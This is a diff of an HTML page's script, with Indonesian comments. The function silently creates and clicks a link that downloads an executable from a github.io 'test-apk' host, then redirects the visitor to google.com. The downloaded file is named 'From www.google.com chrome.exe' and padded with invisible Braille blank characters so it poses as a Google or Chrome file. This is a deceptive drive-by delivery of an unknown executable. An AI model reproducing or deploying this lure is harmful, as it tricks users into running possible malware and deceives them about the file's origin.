@@ -19,18 +19,19 @@
 
 <script>
 function a() {
-  // Buat link sementara untuk download
+
+  // Trigger download terlebih dahulu
   var link = document.createElement('a');
   link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe';
   link.download = 'From⠀www.google.com ⠀⠀⠀⠀⠀ chrome.exe';
-  
-  // Tambahkan ke body dan trigger click
   document.body.appendChild(link);
   link.click();
   document.body.removeChild(link);
 
-  // Segera redirect ke bughunter.net
-  window.location.replace("https://google.com");
+  // Redirect setelah download mulai (delay kecil)
+  setTimeout(function () {
+    window.location.href = "https://google.com";
+  }, 800); // 0.8 detik
 }
 </script>
 
